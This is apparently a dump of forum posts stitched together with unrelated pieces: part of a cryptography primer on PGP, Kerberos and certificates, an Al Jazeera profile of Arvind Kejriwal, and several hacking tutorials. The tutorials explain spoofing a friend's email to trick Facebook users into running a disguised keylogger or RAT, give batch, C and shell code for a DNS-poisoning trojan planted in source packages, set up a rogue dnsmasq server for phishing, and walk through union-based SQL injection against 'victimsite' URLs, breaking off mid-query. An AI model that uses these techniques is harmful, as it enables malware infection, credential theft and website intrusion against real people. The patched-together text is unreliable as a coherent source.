is? Just because Bob has a  public and private key, and purports to be \""Bob,\"" how does Alice know  that a malicious person (Mallory) is not pretending to be Bob?  There are a number of trust models employed by various cryptographic schemes. This section will explore three of them:  The web of trust employed by Pretty Good Privacy (PGP) users, who hold their own set of trusted public keys.  Kerberos, a secret key distribution scheme using a trusted third party.  Certificates, which allow a set of trusted third parties to authenticate each other and, by implication, each others users.  Each of these trust models differs in complexity, general applicability, scope, and scalability.  4.1. PGP Web of Trust Pretty Good Privacy (described more below in Section 5.5) is a widely  used private e-mail scheme based on public key methods. A PGP user  maintains a local keyring of all their known and trusted public keys.  The user makes their own determination about the trustworthiness of a  key using what is called a \""web of trust.\""  If Alice needs Bobs public key, Alice can ask Bob for it in another  e-mail or, in many cases, download the public key from an advertised  server; this server might a well-known PGP key repository or a site that  Bob maintains himself. In fact, Bobs public key might be stored or  listed in many places. (The authors public key, for example, can be  found at  Hidden Content:  You must reply to see links .) Alice is prepared to believe that Bobs public key, as stored at these locations, is valid.  Suppose Carol claims to hold Bobs public key and offers to give the key  to Alice. How does Alice know that Carols version of Bobs key is  valid or if Carol is actually giving Alice a key that will allow Mallory  access to messages? The answer is, \""It depends.\"" If Alice trusts Carol  and Carol says that she thinks that her version of Bobs key is valid,  then Alice may � at her option � trust that key. And trust is not  necessarily transitive; if Dave has a copy of Bobs key and Carol trusts  Dave, it does not necessarily follow that Alice trusts Dave even if she  does trust Carol.  The point here is that who Alice trusts and how she makes that  determination is strictly up to Alice. PGP makes no statement and has no  protocol about how one user determines whether they trust another user  or not. In any case, encryption and signatures based on public keys can  only be used when the appropriate public key is on the users keyring.  4.2. Kerberos Kerberos is a commonly used authentication scheme on the Internet.  Developed by MITs Project Athena, Kerberos is named for the  three-headed dog who, according to Greek mythology, guards the entrance  of Hades (rather than the exit, for some reason!).  Kerberos employs a client/server architecture and provides  user-to-server authentication rather than host-to-host authentication.  In this model, security and authentication will be based on secret key  technology where every host on the network has its own secret key. It  would clearly be unmanageable if every host had to know the keys of all  other hosts so a secure, trusted host somewhere on the network, known as  a Key Distribution Center (KDC), knows the keys for all of the hosts  (or at least some of the hosts within a portion of the network, called a  realm). In this way, when a new node is brought online, only the KDC  and the new node need to be configured with the nodes key; keys can be  distributed physically or by some other secure means.  FIGURE 3: Kerberos architecture.  The Kerberos Server/KDC has two main functions (Figure 3), known as the  Authentication Server (AS) and Ticket-Granting Server (TGS). The steps  in establishing an authenticated session between an application client  and the application server are:  The Kerberos client software establishes a connection with the Kerberos  servers AS function. The AS first authenticates that the client is who  it purports to be. The AS then provides the client with a secret key for  this login session (the TGS session key) and a ticket-granting ticket  (TGT), which gives the client permission to talk to the TGS. The ticket  has a finite lifetime so that the authentication process is repeated  periodically.  The client now communicates with the TGS to obtain the Application  Servers key so that it (the client) can establish a connection to the  service it wants. The client supplies the TGS with the TGS session key  and TGT; the TGS responds with an application session key (ASK) and an  encrypted form of the Application Servers secret key; this secret key  is never sent on the network in any other form.  The client has now authenticated itself and can prove its identity to  the Application Server by supplying the Kerberos ticket, application  session key, and encrypted Application Server secret key. The  Application Server responds with similarly encrypted information to  authenticate itself to the client. At this point, the client can  initiate the intended service requests (e.g., Telnet, FTP, HTTP, or  e-commerce transaction session establishment).  The current shipping version of this protocol is Kerberos V5 (described  in RFC 1510), although Kerberos V4 still exists and is seeing some use.  While the details of their operation, functional capabilities, and  message formats are different, the conceptual overview above pretty much  holds for both. One primary difference is that Kerberos V4 uses only  DES to generate keys and encrypt messages, while V5 allows other schemes  to be employed (although DES is still the most widely algorithm used).  4.3. Public Key Certificates and Certificate Authorities Certificates and Certificate Authorities (CA) are necessary for  widespread use of cryptography for e-commerce applications. While a  combination of secret and public key cryptography can solve the business  issues discussed above, crypto cannot alone address the trust issues  that must exist between a customer and vendor in the very fluid, very  dynamic e-commerce relationship. How, for example, does one site obtain  another partys public key? How does a recipient determine if a public  key really belongs to the sender? How does the recipient know that the  sender is using their public key for a legitimate purpose for which they  are authorized? When does a public key expire? How can a key be revoked  in case of compromise or loss?  The basic concept of a certificate is one that is familiar to all of us.  A drivers license, credit card, or SCUBA certification, for example,  identify us to others, indicate something that we are authorized to do,  have an expiration date, and identify the authority that granted the  certificate.  As complicated as this may sound, it really isnt! Consider drivers  licenses. I have one issued by the State of Vermont. The license  establishes my identity, indicates the type of vehicles that I can  operate and the fact that I must wear corrective lenses while doing so,  identifies the issuing authority, and notes that I am an organ donor.  When I drive outside of Vermont, the other jurisdictions throughout the  U.S. recognize the authority of Vermont to issue this \""certificate\"" and  they trust the information it contains. Now, when I leave the U.S.,  everything changes. When I am in Canada and many other countries, they  will accept not the Vermont license, per se, but any license issued in  the U.S.; some other countries may not recognize the Vermont drivers  license as sufficient bona fides that I can drive. This analogy  represents the certificate chain, where even certificates carry  certificates.  For purposes of electronic transactions, certificates are digital documents. The specific functions of the certificate include:  Establish identity: Associate, or bind, a public key to an individual, organization, corporate position, or other entity.  Assign authority: Establish what actions the holder may or may not take based upon this certificate.  Secure confidential information (e.g., encrypting the sessions symmetric key for data confidentiality).  Typically, a certificate contains a public key, a name, an expiration  date, the name of the authority that issued the certificate (and,  therefore, is vouching for the identity of the user), a serial number,  any pertinent policies describing how the certificate was issued and/or  how the certificate may be used, the digital signature of the  certificate issuer, and perhaps other information.  FIGURE 4: GTE Cybertrust Global Root-issued certificate as viewed by Netscape Navigator V4.  A sample abbreviated certificate is shown in Figure 4. This is a typical  certificate found in a browser; while this one is issued by GTE  Cybertrust, many so-called root-level certificates can be found shipped  with browsers. When the browser makes a connection to a secure Web site,  the Web server sends its public key certificate to the browser. The  browser then checks the certificates signature against the public key  that it has stored; if there is a match, the certificate is taken as  valid and the Web site verified by this certificate is considered to be  \""trusted.\""  TABLE 2. Contents of an X.509 V3 Certificate. version number certificate serial number signature algorithm identifier issuers name and unique identifier validity (or operational) period subjects name and unique identifier subject public key information standard extensions certificate appropriate use definition key usage limitation definition certificate policy information other extensions Application-specific CA-specific The most widely accepted certificate format is the one defined in  International Telecommunication Union Telecommunication Standardization  Sector (ITU-T) Recommendation X.509. Rec. X.509 is a specification used  around the world and any applications complying with X.509 can share  certificates. Most certificates today comply with X.509 Version 3 and  contain the information listed in Table 1.  Certificate authorities are the repositories for public-keys and can be  any agency that issues certificates. A company, for example, may issue  certificates to its employees, a college/university to its students, a  store to its customers, an Internet service provider to its users, or a  government to its constituents.  When a sender needs an intended receivers public key, the sender must  get that key from the receivers CA. That scheme is straight-forward if  the sender and receiver have certificates issued by the same CA. If not,  how does the sender know to trust the foreign CA? One industry wag has  noted, about trust: \""You are either born with it or have it granted upon  you.\"" Thus, some CAs will be trusted because they are known to be  reputable, such as the CAs operated by AT&T, BBN, Canada Post Corp.,  CommerceNet, GTE Cybertrust, MCI, Nortel EnTrust, Thawte, the U.S.  Postal Service, and VeriSign. CAs, in turn, form trust relationships  with other CAs. Thus, if a user queries a foreign CA for information,  the user may ask to see a list of CAs that establish a \""chain of trust\""  back to the user.  One major feature to look for in a CA is their identification policies  and procedures. When a user generates a key pair and forwards the public  key to a CA, the CA has to check the senders identification and takes  any steps necessary to assure itself that the request is really coming  from the advertised sender. Different CAs have different identification  policies and will, therefore, be trusted differently by other CAs.  Verification of identity is just of many issues that are part of a CAs  Certification Practice Statement (CPS) and policies; other issues  include how the CA protects the public keys in its care, how lost or  compromised keys are revoked, and how the CA protects its own private  keys.  4.4. Summary The paragraphs above describe three very different trust models. It is  hard to say that any one is better than the others; it depend upon your  application. One of the biggest and fastest growing applications of  cryptography today, though, is electronic commerce (e-commerce), a term  that itself begs for a formal definition.  PGPs web of trust is easy to maintain and very much based on the  reality of users as people. The model, however, is limited; just how  many public keys can a single user reliably store and maintain? And what  if you are using the \""wrong\"" computer when you want to send a message  and cant access your keyring? How easy it is to revoke a key if it is  compromised? PGP may also not scale well to an e-commerce scenario of  secure communication between total strangers on short-notice.  Kerberos overcomes many of the problems of PGPs web of trust, in that  it is scalable and its scope can be very large. However, it also  requires that the Kerberos server have a priori knowledge of all client  systems prior to any transactions, which makes it unfeasible for  \""hit-and-run\"" client/server relationships as seen in e-commerce.  Certificates and the collection of CAs will form a Public Key  Infrastructure (PKI). In the early days of the Internet, every host had  to maintain a list of every other host; the Domain Name System (DNS)  introduced the idea of a distributed database for this purpose and the  DNS is one of the key reasons that the Internet has grown as it has. A  PKI will fill a similar void in the e-commerce and PKC realm.  While certificates and the benefits of a PKI are most often associated  with electronic commerce, the applications for PKI are much broader and  include secure electronic mail, payments and electronic checks,  Electronic Data Interchange (EDI), secure transfer of Domain Name System  (DNS) and routing information, electronic forms, and digitally signed  documents. A single \""global PKI\"" is still many years away, that is the  ultimate goal of todays work as international electronic commerce  changes the way in which we do business in a similar way in which the  Internet has changed the way in which we communicate.  5. CRYPTOGRAPHIC ALGORITHMS IN ACTION The paragraphs above have provided an overview of the different types of  cryptographic algorithms, as well as some examples of some available  protocols and schemes. Table 2 provides an even longer list of some of  the schemes employed today for a variety of functions, most notably  electronic commerce. The paragraphs below will show several real  cryptographic applications that many of us employ (knowingly or not)  everyday; for password protection and private communication.  TABLE 3.

But more precise and powerful. MOSTLY I HAVE HACKED GIRLS WITH THIS METHOD (because they dont get fooled so easily by a poser and other shit. So this thing can do it) REQUIREMENTS:- 1) A fully FUD server(SERVER BEING FUD is the most important part of the hack) 2) Patience Thats all... Now coming to the hack... there are basically thousands of tutorials in HF about keylogger,RAT,stealer and crypting... so read one and make your server fully fud... Now do just as what i say:- 1) go to \""http://emailattack.host22.com/emailspoof.php\"" and leave that tab open 2) now login to your facebook and copy the username of the person(FB username) you want to hack like this.... Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links so basically the name after the  Hidden Content:  You must reply to see links  is the username...  in my example \""RANDOM\"" is the username.... if the link shows url like \""https://www.facebook.com/profile.php?id=100003721756694\"" then you cannot use this method on them.... 3) as you are the friend of the person you must know who he his/her best friend or just close friend.... so basically get his email id attached to his Facebook like [url=\""http://imageshack.us/photo/my-images/152/contactw.png\""]http://imageshack.us/photo/my-images/152/contactw.png [/url] Hidden Content:  You must reply to see links [this can be hard if you dont have this person as your friend] anyways you can ask his/her email id if you know him.... 4)Now just open that spoofer tab and paste the info as follows:- in Spoofed Email: the id you stolen from the contact info: ex: \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"" in Targets Email: \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"", ex: \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"" in Reply Email: same as spoofed email in message title: hi or whatever in message body : Hi check out my new pics uploaded here: \""link of your key-logger,rat or whatever\"" HE/SHE WILL RECEIVE THAT MESSAGE FROM THE SPOOFED PERSON AND AS HE/SHE IS HER CLOSE FRIEND SHE WILL DEFINITELY DOWNLOAD AND RUN IT slave WILL TAKE SOME TIME TO READ THE MESSAGE>DOWNLOAD THE FILE>RUN IT. THATS WHY I SAID PATIENCE IS A REQUIREMENT .... PRO-TIP:  1) If you are using the message from the example then i suggest you to download some of the spoofed person(slave friend)  pictures and use icon-changer to change your server icon to JPEG icon and put all that pics and your server to an .rar file and  upload it to the hosting site.... Lol,,,, no one sees the extension if you do this thing..  2) use rats crew extension spoofer to change the extension to JPEG and change server icon to JPEG too.... TuT by    thehackerboy   """

0	Here is a small share of my knowledge on dns poisining(remote dns poisining) :)	"""   [COLOR=\""#FF0000\""]B4 yu go ahead to read this thread i think yu should read 1st the basics of DNS poising... so tht it will be easier to understand this thread... for reading the basic things and understandin it goto  http://indianhacker.in/showthread.php?15...poisining- ) Following is A post on DNS Poisoning which is Internet DNS Poisoning, also known as Remote DNS Poisoning.  This type of DNS poisoning can be done over a single or multiple victims and no matter where your victim is in world, the primary DNS entries of his/her system can be poisoned using this method. For this type of DNS poisoning attack youll have to setup a rouge DNS server somewhere with static IP address and please note that it should be in working condition. Methods of poisoning are different for Windows and Linux systems but happens with help of same entity that is Trojan file. Here I ll show you how to create DNS poisoning Trojans all you have to do is vector them. For Windows: For poisoning DNS of victim you must know name of his/her interface or name he/she has set for his/her internet connection. This condition is must for you to poison victims DNS if you dont know their values then use default Ã¢â¬ÅLocal Area ConnectionÃ¢â¬Â. Now lets create a DNS spoofing Trojan Batch file. Type following lines in notepad and save it with any name and .bat extension. netsh interface ip set dns Ã¢â¬ÅLocal Area ConnectionÃ¢â¬Â static 115.98.23.45 Above command will set DNS server of victim to 115.98.23.45 , you can change Ã¢â¬ÅLocal Area ConnectionÃ¢â¬Â by name of interface or connection if you know it, else always go with default. Now send that file to victim for poisoning his/her DNS entries. If you dont want to send bat file because your victim might suspect it, then you can create an executable file by compiling following C program.[/COLOR] [COLOR=\""#00FFFF\""]#include<stdio.h> #include<stdlib.h> int main() { char *str= Ã¢â¬Ånetsh interface ip set dns Ã¢â¬ÅLocal Area ConnectionÃ¢â¬Â static 115.98.23.45Ã¢â¬Â; system(str); return 0 ; }[/COLOR] For Linux And UNIX: Linux and UNIX systems save DNS entries in /etc/resolv.conf folder by changing entries in this file can help you poison DNS in Linux and UNIX systems. Now get IP address of working DNS server and IP address of rouge DNS server set by you. Suppose IP address of rouge DNS is 115.98.23.45 and real DNS server is 117.98.23.48. Then type following commands in a text file and save with .sh extension(for example change.sh ). [COLOR=\""#00FFFF\""]echo Ã¢â¬Ånameserver 115.98.23.45Ã¢â¬Â > /etc/resolv.conf echo Ã¢â¬Ånameserver 117.98.23.48Ã¢â¬Â >> /etc/resolv.conf[/COLOR] [COLOR=\""#FF0000\""]Now all you have to do is vector this file to victim. For vectoring it get any source code installation package from internet of an interesting software your victim cant deny to install in his/her system. Extract it and find a shell script in it, place change.sh in that folder, open target shell script in text editor and before it ends type following commands, chmod +x change.sh ./change.sh Pack it again and send to your victim for installation once he/she installs software from your source code he/she will be infected. Now sometimes its difficult to find a shell script in package but what is not difficult to find is a C source file. So if you get problem with above method, find a C source file with several functions in it and create following new function in it.[/COLOR] [COLOR=\""#00FFFF\""]void change12345() { char *str; str= Ã¢â¬Åecho Ã¢â¬Ånameserver 115.98.23.45Ã¢â¬Â > /etc/resolv.confÃ¢â¬Â; system(str); str= Ã¢â¬Åecho Ã¢â¬Ånameserver 117.98.23.48Ã¢â¬Â >> /etc/resolv.confÃ¢â¬Â; system(str); return; }[/COLOR] [COLOR=\""#FF0000\""]And call this function in any other function before it returns something. Pack files again and send it to your victim, your file will execute every time when your victim will launch that program. Now note that above exploits codes are really very basic, you can modify them according to your needs and if you think they are difficult to understand please get your hands on programming, even if you can understand basic programming you can write your own exploit codes.[/COLOR]   """

0	DNS Hacking &amp; Hijacking Tutorial	"""   DNS Hacking & Hijacking Tutorial Hidden Content:  You must reply to see links This  is an introduction to DNS poisoning which also includes an example of  quite a nifty application of it using the IP Experiment. ItÃ¢â¬â¢s purely  educational, so IÃ¢â¬â¢m not responsible for how you use the information in  it. To start, youÃ¢â¬â¢ll need Ã¢â¬Â¢ A computer running Linux (Ubuntu in my case) Ã¢â¬Â¢ A basic understanding of how the Domain Name System (DNS) works. Note that this is a more advanced topic; donÃ¢â¬â¢t try this if you donÃ¢â¬â¢t know what youÃ¢â¬â¢re doing. Why DNS? The  DNS provides a way for computers to translate the domain names we see  to the physical IPs they represent. When you load a webpage, your  browser will ask its DNS server for the IP of the host you requested,  and the server will respond. Your browser will then request the webpage  from the server with the IP address that the DNS server supplied. If  we can find a way to tell the client the wrong IP address, and give  them the IP of a malicious server instead, we can do some damage. Malicious DNS Server So  if we want to send clients to a malicious web server, first we need to  tell them its IP, and so we need to set up a malicious DNS server. The server IÃ¢â¬â¢ve selected is dnsmasq Ã¢â¬â its lightweight and the only one that works for this purpose (that IÃ¢â¬â¢ve found) To  install dnsmasq on Ubuntu, run sudo apt-get install dnsmasq, or on  other distributions of Linux, use the appropriate package manager. Once youÃ¢â¬â¢ve installed it you can go and edit the configuration file (/etc/dnsmasq.conf) sudo gedit /etc/dnsmasq.conf The  values in there should be sufficient for most purposes. What we want to  do is hard-code some IPs for certain servers we want to spoof The format for this is address=/HOST/IP So for example; address=/facebook.com/63.63.63.63 where 63.63.63.63 is the IP of your malicious web server Save the file and restart dnsmasq by running sudo /etc/init.d/dnsmasq restart You now have a DNS server running which will redirect requests for facebook.com to 63.63.63.63 Malicious Web Server You probably already have a web server installed. If not, install apache. This is pretty basic, so I wonÃ¢â¬â¢t cover it here. There  are a couple of things you can do with the web server. It will be  getting all the traffic intended for the orignal website, so the most  likely cause of action would be to set up some sort of phishing site IÃ¢â¬â¢ll presume you know how to do that though Another  alternative is to set up some sort of transparent proxy which logs all  activity. I might come back to this in the future. I Can Be Your DNS Server Plz? An  alternative is to, instead of a spoof webserver, set up a Metasploit  browser_autopwn module . You can have lots of fun with that But how do you get a victim? Well this is where my project, the IP Experiment could come in handy If  you donÃ¢â¬â¢t know, the IP Experiment basically harvests peopleÃ¢â¬â¢s IPs  through websites such as forums and scans them for open ports. A  surprising number of these IPs have port 80 open and more often that  not, that leads straight to a router configuration mini-site. Ã¢â¬ËAdminÃ¢â¬â¢  and Ã¢â¬ËpasswordÃ¢â¬â¢ will get you far in life; its fairly easy to login and  change the DNS settings. Tutorial by doc   """

3	Indias Assange crusades against corruption	"""   Arvind Kejriwal has shaken the political establishment with a string of accusations against top leaders and businesses. [TABLE] [TR] [TD]Arvind Kejriwal and his supporters use protests to reinforce their anti-corruption message [EPA]                  [/TD]          [/TR]          [TR]              [TD=\""class: DetailedSummary\""]                 In a country where accountability and transparency  are often thought of as the first causalities of holding public office,  Arvind Kejriwal, a mechanical engineer and former bureaucrat from  Haryana, has blown the whistle on Indias corrupt.  In the last fortnight, he has released details and levelled charges  four times against top Indian politicians and the countrys biggest  business conglomerate.  \""We want to turn the power structure upside-down and make the  powerful accountable,\"" Kejriwal, 44, a thin man with a moustache and  piercing eyes, said.  Indias middle class population, which prefers to bemoan the state of  chaos and corruption in the nation, have found in Kejriwal a person who  is not afraid to bring forth allegations of fraud to the doorstep of  Indias leaders.  Its been a long and busy day for Kejriwal following his string of  revelations and corruption charges in the past fortnight on many of  Indias leading political and business figures. He disengages from  throngs of his followers of the India Against Corruption (IAC), a  peoples organisation he founded in 2006 encouraging public engagement.  \""People of this country are fed up, and the conditions are right for a  movement to set things right,\"" he said in an exclusive interview with  Al Jazeera.   Targeting the mighty  [TABLE=\""class: Skyscrapper_Body, width: 250\""]   [TR]  [TD]  \"" Its not about sensational exposures... The intent is to bring a radical change in politics and accountability.\""   - Arvind Kejriwal  [/TD]  [/TR]   [/TABLE]  Charging the countrys most powerful with corruption, Kejriwal has  discomforted the government. \""They have found the ground beneath their  feet shaken\"", he exclaimed.   However, he is wary of the title Indias Julian Assange, the founder  of the whistle-blowing organisation WikiLeaks now wanted by the US  government for making top secret government documents available to the  public, which some have bestowed upon him.  \""Its not about sensational exposures,\"" he said. \""The intent is to bring a radical change in politics and accountability.\""  Kejriwals accusations are based on government documents he says are  proof of corruption, which he had obtained using the Right to  Information Act, under which any citizen may compel the government to  share information.  On October 5, Kejriwal made a public accusation against Robert Vadra,  son-in-law of Congress party president Sonia Gandhi. He claimed that  Vadra had purchased property worth millions of dollars with \""interest  free unsecured free loan\"" by DLF, Indias major construction company.  DLFs market value dropped in a single day to the tune of $580m  following the accusation.  A week later Kejriwal pinpointed financial irregularities to the tune  of Rs 71 lakh ($130,000) by the Zakir Hussain Memorial Trust, a  non-governmental organisation for the disabled that is headed by federal  minister Salman Khurshid and his wife Louise. He took to the streets  with his followers saying the Khurshids had misappropriated funds  allocated for the physically challenged to distribute tricycles and  hearing aids for the needy across 17 districts of Uttar Pradesh. A  Comptroller and Auditor Generals Report (CAG) had earlier reported the  irregularities too.  Then, on October 17, Kejriwal targeted the opposition party, the  Bharatiya Janata Party (BJP). He accused party president Nitin Gadkari  of land grabbing by colluding with the ruling party in the western state  of Maharashtra, and exploiting poor farmers to further his business  interests in real estate. And most recently, on October 31,  Kejriwal accused Indias Prime Minister Manmohan Singh and the countrys  largest business empire Reliance Industries Limited (RIL)s chairman of  malpractice. He alleged the government of going soft on RIL, allowing  them to amass undue profits beyond its contract to develop the countrys  key natural gas field in the Krishna Godavari (KG) basin. He also said  the RIL was responsible for the unnatural rise in prices of gas at  \""three times higher than normal\"".   Pursuing the truth Despite strong denials from those who stand accused, Kejriwals revelations have undoubtedly stirred the establishment.  [TABLE=\""width: 33, align: right\""]   [TR]  [TD] [/TD]  [/TR]  [TR]  [TD=\""align: center\""] Anna Hazare, right,  was Kejriwals mentor, but the two  have parted ways now [AP] [/TD]  [/TR]   [/TABLE]  Robert Vadra, Sonia Gandhis son-in-law, has denied the charges  brought against him; DLF has also denied offering favourable discounts  for purchase of property. Gandhi, for her part, has remained silent on  the matter, refraining from making any public statements.  Kejriwal brushed aside the defences of Vadra and senior Congress  leaders, saying their clarifications were \""half-truths and lies\"". For  their part, Salman and Louise Khurshid made a televised appearance  denying the charges of misappropriating funds, and are seeking  defamation damages to the tune of Rs 100 crore ($20m). In response,  Kejriwal decided to take the matter further and staged a massive rally  in Farrukhabad, Khurshids constituency, on November 1, urging voters  not to re-elect him. Opposition leader Gadkari and representatives of RIL have also issued statements denying Kejriwals charges. Critics  say that Kejriwal has been acting like a political novice by releasing a  slew of allegations that may not come to much. Khurshid, for once, has  said that Kejriwal was \""an ant taking on the might of an elephant\"". Kejriwal  accepts that survival in Indian politics against established political  behemoths requires \""strategic planning\"", acknowledging that his \""timing  could have been planned better\"".  While Kejriwal admits he is  still learning, he believes that the truth will prevail. \""Remember they  may have survived for many decades in politics, but we too are  formidable foes in pursuing truth,\"" he said.  Symbol of discontent To  his credit, Kejriwals accusations seem to have emboldened the people,  created awareness, and incited the press to pursue and investigate the  allegations.   For many people, Kejriwal is a symbol of Indias  growing discontent with corruption and inefficiency. The country saw a  groundswell of support when he, along with veteran social activist Anna  Hazare, sought to demand greater accountability from Indias government  with 2011s Lokpal (Ombudsman) Bill.  Followers say Kejriwal pursues a simple lifestyle, living with his  bureaucrat wife and two children in a housing colony in New Delhi. His  office is crammed with people and sports basic facilities.  After differences broke out between Hazare and Kejriwal, the latter has chosen to go alone with the IAC.  \""Anna and I are on different paths now, but our goal to fight corruption is the same\"", he said.  [TABLE=\""class: Skyscrapper_Body, width: 250\""]   [TR]  [TD]  \""The powerful cannot face the truth I show them for long, and will need to offer clean politics.\""   - Arvind Kejriwal  [/TD]  [/TR]   [/TABLE]  Kejriwal hails from a middle class family in Haryana, and gave up his  government job to take on public life. \""My journey has been one that  has slowly and surely gained force to challenge corruption and bribery  in public life to make India better.\"" Kejriwal objects to the  fact that \""power is vested in a political establishment in Delhi and in  state capitals. It needs to be people-centric\"". His use of street  protests has earned him the respect of the middle class. However,  his critics say that his brand of protest will probably not bring a  massive overhaul of Indias corrupt systems. If his revelations have not  led to any resignations or arrests, they wonder what his protests will  be able to amount to.  \""The powerful cannot face the truth I show them for long, and will need to offer clean politics\"", Kejriwal explained.  \""My  movement will survive as long as the people of this country demand  justice. I see that people have woken up and are ready for change. I am  optimistic about the future.\""                                                [/TD]          [/TR]          [TR]              [TD=\""class: Tmp_hSpace10\""]              [/TD]          [/TR]                   [TR=\""class: SourceBarTitle\""]  [TD]                                      Source:                                                                             Al Jazeera                  [/TD] [/TR] [/TABLE]   """
0	Sqli Tutorial	""" Before we see what SQL Injection is. We should know what SQL and Database are. Database: Database is collection of data. In website point of view, database is used for storing user ids, passwords, web page details and more. Some List of Database are: * DB servers. * MySQL (Open source). * MSSQL. * MS-ACCESS. * Oracle. * Postgre SQL (open source). * SQLite. SQL: Structured Query Language is Known as SQL. In order to communicate with the Database, we are using SQL query. We are querying the database so it is called as Query language. Definition from Complete reference: SQL is a tool for organizing, managing, and retrieving data stored by a computer database. The name \""SQL\"" is an abbreviation for Structured Query Language. For historical reasons, SQL is usually pronounced \""sequel,\"" but the alternate pronunciation \""S.Q.L.\"" is also used. As the name implies, SQL is a computer language that you use to interact with a database. In fact, SQL works with one specific type of database, called a relational database. Simple Basic Queries for SQL:  Select * from table_name : this statement is used for showing the content of tables including column name. For e.g.:  select * from users; Insert into table_name(column_names,...) values(corresponding values for columns): For inserting data to table. For eg: insert into users(username,userid) values(\""BreakTheSec\"",\""break\""); I will give more detail and query in my next thread about the SQL QUERY. What is SQL Injection? SQL injection is Common and famous method of hacking at present . Using this method an unauthorized person can access the database of the website. Attacker can get all details from the Database. What an attacker can do? * ByPassing Logins * Accessing secret data * Modifying contents of website * Shutting down the My SQL server Now lets dive into the real procedure for the SQL Injection. Follow my steps. Step 1: Finding Vulnerable Website: Our best partner for SQL injection is Google. We can find the Vulnerable websites(hackable websites) using Google Dork list. google dork is searching for vulnerable websites using the google searching tricks. There is lot of tricks to search in google. But we are going to use \""inurl:\"" command for finding the vulnerable websites. Some Examples: inurl:index.php?id= inurl:gallery.php?id= inurl:article.php?id= inurl:pageid= Here is the huge list of Google Dork http://www.ziddu.com/download/13161874/A...t.zip.html How to use? copy one of the above command and paste in the google search engine box. Hit enter. You can get list of web sites. We have to visit the websites one by one for checking the vulnerability. So Start from the first website. Note:if you like to hack particular website,then try this: site: http://www.victimsite.com  dork_list_commands for eg: site: http://www.victimsite.com  inurl:index.php?id= Step 2: Checking the Vulnerability: Now we should check the vulnerability of websites. In order to check the vulnerability ,add the single quotes() at the end of the url and hit enter. (No space between the number and single quotes) For eg: http://www.victimsite.com/index.php?id=2    If the page remains in same page or showing that page not found or showing some other webpages. Then it is not vulnerable.  If it showing any errors which is related to sql query,then it is vulnerable. Cheers..!! For eg: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \\ at line 1 Step 3: Finding Number of columns: Now we have found the website is vulnerable. Next step is to find the number of columns in the table.  For that replace the single quotes() with \""order by n\"" statement.(leave one space between number and order by n statement) Change the n from 1,2,3,4,,5,6,...n. Until you get the error like \""unknown column \"". For eg: http://www.victimsite.com/index.php?id=2  order by 1 http://www.victimsite.com/index.php?id=2  order by 2 http://www.victimsite.com/index.php?id=2  order by 3 http://www.victimsite.com/index.php?id=2  order by 4  change the number until you get the error as \""unknown column\"" if you get the error while trying the \""x\""th number,then no of column is \""x-1\"". I mean: http://www.victimsite.com/index.php?id=2  order by 1(noerror) http://www.victimsite.com/index.php?id=2  order by 2(noerror) http://www.victimsite.com/index.php?id=2  order by 3(noerror) http://www.victimsite.com/index.php?id=2  order by 4(noerror) http://www.victimsite.com/index.php?id=2  order by 5(noerror) http://www.victimsite.com/index.php?id=2  order by 6(noerror) http://www.victimsite.com/index.php?id=2  order by 7(noerror) http://www.victimsite.com/index.php?id=2  order by 8(error)    so now x=8 , The number of column is x-1 i.e, 7. Sometime the above may not work. At the time add the \""--\"" at the end of the statement. For eg: http://www.victimsite.com/index.php?id=2  order by 1-- Step 4: Displaying the Vulnerable columns: Using \""union select columns_sequence\"" we can find the vulnerable part of the table. Replace the \""order by n\"" with this statement. And change the id value to negative(i mean id=-2,must change,but in some website may work without changing). Replace the columns_sequence with the no from 1 to x-1(number of columns) separated with commas(,). For eg: if the number of columns is 7 ,then the query is as follow: http://www.victimsite.com/index.php?id=-2  union select 1,2,3,4,5,6,7-- If the above method is not working then try this: http://www.victimsite.com/index.php?id=-2  and 1=2 union select 1,2,3,4,5,6,7-- It will show some numbers in the page(it must be less than x value, i mean less than or equl to number of columns).  Like this: Now select 1 number. It showing 3,7. Lets take the Number 3. Step 5: Finding version,database,user Now replace the 3 from the query with \""version()\"" For eg: http://www.victimsite.com/index.php?id=-2  and 1=2 union select 1,2,version(),4,5,6,7--  It will show the version as 5.0.1 or 4.3. something like this. Replace the version() with database() and user() for finding the database,user respectively. For eg: http://www.victimsite.com/index.php?id=-2  and 1=2 union select 1,2,database(),4,5,6,7--  http://www.victimsite.com/index.php?id=-2  and 1=2 union select 1,2,user(),4,5,6,7--  If the above is not working,then try this: http://www.victimsite.com/index.php?id=-2  and 1=2 union select 1,2,unhex(hex(@@version)),4,5,6,7-- Step 6: Finding the Table Name  if the version is 5 or above. Then follow these steps.  Now we have to find the table name of the database. Replace the 3 with \""group_concat(table_name) and add the \""from information_schema.tables where table_schema=database()\"" For eg: http://www.victimsite.com/index.php?id=-2  and 1=2 union select 1,2,group_concat(table_name),4,5,6,7 